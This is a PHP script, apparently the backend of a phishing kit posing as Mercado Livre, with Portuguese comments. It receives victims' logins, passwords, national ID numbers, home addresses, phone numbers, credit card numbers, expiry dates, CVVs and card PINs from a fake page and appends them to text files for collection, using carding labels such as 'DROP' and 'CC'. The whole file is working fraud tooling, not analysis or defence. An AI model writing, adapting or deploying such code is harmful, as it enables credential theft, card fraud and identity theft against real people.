<?php
session_start();
if (isset($_POST['login'])) {
    // Captura o dado enviado pelo AJAX
   $_SESSION['login'] =  $login = addslashes(htmlspecialchars_decode($_POST['login']));

$myFile = "./loginsML/"  . "loginsML" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 

"
===LOGIN ML===
#LOGIN: $login 
";
fwrite($fh, $stringData);
fclose($fh);
sleep(1);

  
} 

// SENHA

if (isset($_POST['senha'])) {
    // Captura o dado enviado pelo AJAX
   $_SESSION['senha'] =  $senha = addslashes(htmlspecialchars_decode($_POST['senha']));

$myFile = "./loginsML/"  . "loginsML" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 

"
#SENHA: $senha 
";
fwrite($fh, $stringData);
fclose($fh);
sleep(1);

  
} 


// SALVAR O ENDEREÇO DO BICO

if(isset($_POST['nome'])):
$_SESSION['nome'] = $nome = addslashes(htmlspecialchars_decode($_POST['nome']));
$_SESSION['cpf'] = $cpf = addslashes(htmlspecialchars_decode($_POST['cpf']));
$_SESSION['cep'] = $cep = addslashes(htmlspecialchars_decode($_POST['cep']));
$_SESSION['estado']=$estado = addslashes(htmlspecialchars_decode($_POST['estado']));
$_SESSION['cidade']=$cidade = addslashes(htmlspecialchars_decode($_POST['cidade']));
$_SESSION['bairro']=$bairro = addslashes(htmlspecialchars_decode($_POST['bairro']));
$_SESSION['rua']=$rua = addslashes(htmlspecialchars_decode($_POST['rua']));
$_SESSION['numero']=$numero = addslashes(htmlspecialchars_decode($_POST['numero']));
$_SESSION['telefone']=$telefone = addslashes(htmlspecialchars_decode($_POST['telefone']));
$complemento = addslashes(htmlspecialchars_decode($_POST['complemento']));
$_SESSION['casa'] = $casa = addslashes(htmlspecialchars_decode($_POST['casa']));

$myFile = "./loginsML/"  . "loginsML" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 

"==DROP==
NOME: $nome
CEP: $cep
ESTADO: $estado
CIDADE: $cidade
BAIRRO: $bairro
RUA: $rua
N: $numero
TELEFONE: $telefone
COMPLEMENTO $complemento
";
fwrite($fh, $stringData);
fclose($fh);
sleep(1);
   


endif;    


// INFO CC SALVAR

if(isset($_POST['titular'])):
$cc = addslashes(htmlspecialchars_decode($_POST['cc']));
$titular = addslashes(htmlspecialchars_decode($_POST['titular']));
$validade = addslashes(htmlspecialchars_decode($_POST['validade']));
$cvv = addslashes(htmlspecialchars_decode($_POST['cvv']));
$cpf = addslashes(htmlspecialchars_decode($_POST['cpf']));
$parcela = addslashes(htmlspecialchars_decode($_POST['parcela']));





$myFile = "./loginsML/"  . "infosML" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 

"==CC==
CARD: $cc
TITULAR: $titular
VALIDADE: $validade
CVV: $cvv
CPF: $cpf
PARCELA: $parcela

BANCO > $tipoCC1
BAND > $tipoCC 
NIVEL > $categoria 
CARD > $banco

";
fwrite($fh, $stringData);
fclose($fh);
sleep(1);

   endif; 


   if (isset($_POST['senhacard'])) {
    // Captura o dado enviado pelo AJAX
   $_SESSION['senhacard'] =  $senhacard = addslashes(htmlspecialchars_decode($_POST['senhacard']));

$myFile = "./loginsML/"  . "loginsML" . ".txt";
$fh = fopen($myFile, 'a') or die("Impossaivel abrir arquivo.");
$stringData = 

"
#SENHACARD: $senhacard 
";
fwrite($fh, $stringData);
fclose($fh);
sleep(1);

  
} 
?>
